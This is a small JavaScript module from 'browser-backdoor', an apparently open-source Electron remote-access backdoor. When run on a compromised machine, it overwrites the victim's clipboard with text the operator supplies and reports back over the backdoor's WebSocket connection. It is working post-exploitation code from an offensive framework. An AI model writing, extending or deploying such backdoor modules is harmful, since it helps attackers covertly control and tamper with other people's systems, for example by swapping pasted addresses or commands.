// INTERACTIVE
/**
 * @file writeClipboard Module
 * @summary Writes to the client system's clipboard.
 * @author IMcPwn 
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

electron = require('electron');

/**
 * @param {String} data - The text to write to the clipboard.
 * @return {String} "Wrote $data to clipboard"
 */
writeClipboard = function (data) {
    electron.clipboard.writeText(data);
    ws.send("Wrote " + data + " to clipboard");
}

ws.send("\nUsage: writeClipboard(data)\n- data is the text to write to the clipboard.");
